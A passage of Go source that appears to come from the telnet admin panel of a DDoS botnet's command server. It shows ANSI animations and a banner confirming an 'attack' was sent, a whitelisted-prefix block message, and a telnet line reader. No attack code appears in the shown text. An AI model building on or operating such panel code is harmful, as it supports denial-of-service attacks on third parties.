            this.conn.Write([]byte("\033[36m PREPAREING-------------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------------------------->                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
			            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[32m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[32m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[32m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[32m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/**/|       \r\n"))
            this.conn.Write([]byte("\033[34m           / == /       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |  |        \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[33m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[33m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[33m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[33m|                         |        \r\n"))
            this.conn.Write([]byte("\033[33m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[93m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[37m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[37m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[97m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[37m          | ;  :|    nuke          \r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header	
			this.conn.Write([]byte("\033[1;49;32m	                         ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                            ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                            ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                  \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ╔══════════════════════════════════════════╗    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32mYour Attack Was Sent To The Demon Slayers\033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32mPlease Wait Your cooldown For Next attack\033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32m         <3 Kronus                       \033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ╚══════════════════════════════════════════╝    \033[0m \r\n"))	
			this.conn.Write([]byte("\033[1;49;35m                                                           \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                    ███████╗███████╗███╗   ██╗████████╗    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ███████╗█████╗  ██╔██╗ ██║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ╚════██║██╔══╝  ██║╚██╗██║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ███████║███████╗██║ ╚████║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝       \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m\r\n"))	
				} else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 999999)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
